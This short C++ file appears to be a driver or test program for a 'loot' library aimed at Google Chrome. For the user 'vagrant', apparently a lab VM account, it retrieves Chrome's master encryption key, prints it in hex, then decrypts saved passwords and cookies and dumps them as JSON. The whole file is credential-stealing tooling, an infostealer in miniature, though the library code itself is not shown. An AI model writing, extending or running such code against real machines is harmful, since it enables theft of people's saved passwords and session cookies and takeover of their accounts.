#include <iostream>
#include "../loot/loot.hpp"

using namespace std;

int main() {
	unsigned char* masterKey = new unsigned char[MASTER_KEY_SIZE];

	getMasterKey(masterKey, "vagrant");
	printUCharAsHex(masterKey, MASTER_KEY_SIZE);

	json passwords = lootChromePasswords((const unsigned char*) masterKey, "vagrant");
	std::cout << "\npasswords: " << passwords.dump(4) << std::endl;

	json cookies = lootChromeCookies((const unsigned char*) masterKey, "vagrant");
	cout << "cookies: " << cookies.dump(4) << endl;

	delete[] masterKey;
	return 0;
}
